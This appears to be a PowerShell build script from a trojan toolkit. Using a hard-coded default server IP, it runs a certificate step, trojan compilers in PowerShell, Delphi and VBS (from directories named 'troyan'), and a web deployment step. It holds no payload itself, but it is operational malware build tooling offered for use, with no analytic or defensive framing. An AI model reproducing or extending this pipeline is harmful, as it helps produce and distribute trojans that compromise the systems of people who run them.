param (
    [string]$serverName, [string]$action = "apply"
)

if ($serverName -eq "") {
    $serverName = "185.247.141.76"
    $action = "exe"
} 

if ([string]::IsNullOrEmpty($serverName))
{
    throw "compile.ps1 -serverName argument is null"
}

#currents
$scriptDir = Split-Path -Parent $MyInvocation.MyCommand.Path
Set-Location -Path $scriptDir
. ".\current.ps1" -serverName $serverName
if ([string]::IsNullOrEmpty($server.rootDir)) {
    throw "compile1.ps1 - server is not linked"
}

#cert
& (Join-Path -Path $scriptDir -ChildPath "./compile.cert.ps1") -serverName $serverName

#general script
& (Join-Path -Path $server.troyanDir -ChildPath "./troyancompile.ps1") -serverName $serverName

#delphi
& (Join-Path -Path $server.troyanDelphiDir -ChildPath "./delphicompile.ps1") -serverName $serverName

#vbs
& (Join-Path -Path $server.troyanVbsDir -ChildPath "./vbscompile.ps1") -serverName $serverName


if ($action -eq "apply")
{
    #web
    & (Join-Path -Path $scriptDir -ChildPath "./compile.web.ps1") -serverName $serverName
}
Write-Host "Compile complete"